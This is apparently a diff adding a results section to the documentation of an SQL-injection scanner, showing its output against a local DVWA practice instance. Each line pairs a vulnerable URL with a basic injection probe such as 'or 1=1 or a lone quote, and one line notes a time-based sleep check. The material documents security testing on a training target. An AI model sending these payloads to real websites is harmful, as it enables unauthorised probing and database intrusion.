@@ -90,3 +90,21 @@ sending multiple requests..
 .
 
 ```
+
+> Result
+
+```python
+[+]  http://localhost/DVWA/vulnerabilities/sqli/?id= 'or 1=1
+[+]  http://localhost/DVWA/vulnerabilities/sqli/?id= '
+5 Seconds sleep
+[+]  http://localhost/DVWA/vulnerabilities/sqli/?id= or 1=1
+[+]  http://localhost/DVWA/vulnerabilities/sqli/?id= "
+[+]  http://localhost/DVWA/vulnerabilities/sqli/?id= '
+[+]  http://localhost/DVWA/vulnerabilities/sqli/?id= 'or 1=1
+[+]  http://localhost/DVWA/vulnerabilities/sqli/?id= 'or 1=1
+[+]  http://localhost/DVWA/vulnerabilities/sqli/?id= or 1=1
+[+]  http://localhost/DVWA/vulnerabilities/sqli/?id= '
+[+]  http://localhost/DVWA/vulnerabilities/sqli/?id= "
+[+]  http://localhost/DVWA/vulnerabilities/sqli/?id= "
+[+]  http://localhost/DVWA/vulnerabilities/sqli/?id= or 1=1
+```
